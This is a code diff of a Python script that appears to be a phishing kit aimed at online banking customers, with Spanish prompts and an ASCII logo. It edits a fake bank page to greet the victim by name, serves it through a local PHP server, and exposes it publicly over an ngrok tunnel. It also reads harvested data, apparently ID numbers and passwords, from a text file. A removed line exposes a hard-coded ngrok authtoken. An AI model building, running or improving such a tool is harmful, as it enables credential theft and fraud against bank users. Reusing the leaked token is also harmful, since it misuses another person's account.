@@ -2,6 +2,8 @@
 import os
 import time
 import subprocess
+import requests
+import json
 
 clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
 
@@ -12,19 +14,15 @@ def logo():
     print('888  \    /  Y88b   |  Y88b | 888  \   888   /  888   | 888  `Y88b, 888   |') 
     print('888   |  /____Y88b  |   Y88b| 888   \  888_-~   888   | 888    8888 888   |')
     print("888__/  /      Y88b |    Y888 888    \ 888      888   | 888 \__88P' 888   |")                                                                                                                                                                             
-    print('                                               By BR4CKSTAR')
+    print('                                By BR4CKSTAR')
 
 def usuarionombre():
     with open('index.html', 'r') as archivo:
         lineas = archivo.readlines()
-
     name = input('Ingrese el nombre de usuario: \n     1- Atrás\nKeyphish:~$ ')
-
     lineas[16] = '        Felicidades '+name+', ingresa a tu banca web para continuar\n'
-
     with open('index.html', 'w') as archivo:
         archivo.writelines(lineas)
-
     if y==1:
          clearConsole()
          os.system("python3 bankphish.py")
@@ -51,6 +49,7 @@ def cedula():
     archivo.close()
 
 def contra():
+    ngrok()
     archivo = open("datos.txt", "r")
     lineas = archivo.readlines()
     archivo.close()
@@ -60,6 +59,8 @@ def contra():
     while True:
         numero = input("\n\nIngrese un número para finalizar: ")
         if numero.isdigit():
+            subprocess.Popen(['pkill', 'php'])
+            subprocess.Popen(['pkill', 'ngrok'])
             break
 
         time.sleep(2)
@@ -86,22 +87,15 @@ def link():
 
 
 def ngrok():
-    with open('ngrok.yml', 'w') as f:
-        f.write('authtoken: 26NrVm7Ma8aSS0EWC5l0cdNXuVs_s6PCJgUWrQMJJ71PYQcp\n') 
-        f.write('tunnels:\n')
-        f.write('  web:\n')
-        f.write('    addr: 8000\n')
-    proceso_ngrok = subprocess.Popen(['ngrok', 'start', '--config=ngrok.yml', '--all'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    php_command = ['php', '-S', 'localhost:8080']
+    php_process = subprocess.Popen(php_command)
     time.sleep(2)
-    output = subprocess.check_output(['ngrok', 'http', '8000'])
-    url_ngrok = output.decode('utf-8').strip().split('\n')[1].split(' ')[1]
-    print("URL de ngrok:", url_ngrok)
-    return proceso_ngrok, url_ngrok
-
-def detener_servidor_y_ngrok(proceso_php, proceso_ngrok):
-    proceso_php.terminate()
-    proceso_ngrok.terminate()
-    print("Servidor PHP y ngrok detenidos")
+    ngrok_command = ['ngrok', 'http', '8080']
+    ngrok_process = subprocess.Popen(ngrok_command, stdout=subprocess.PIPE)
+    time.sleep(2)
+    ngrok_output = ngrok_process.stdout.readlines()
+    public_url = ngrok_output[-1].strip().decode('utf-8')
+    print(f'URL pública: {public_url}')
 
 
 def dependencias():
@@ -132,9 +126,8 @@ if y==0:
 if y==1:
     clearConsole()
     logo()
-    proceso_php, proceso_ngrok, url_ngrok = ngrok()
     contra()
-    detener_servidor_y_ngrok(proceso_php, proceso_ngrok)
+    
 
 elif y==2:
     clearConsole()
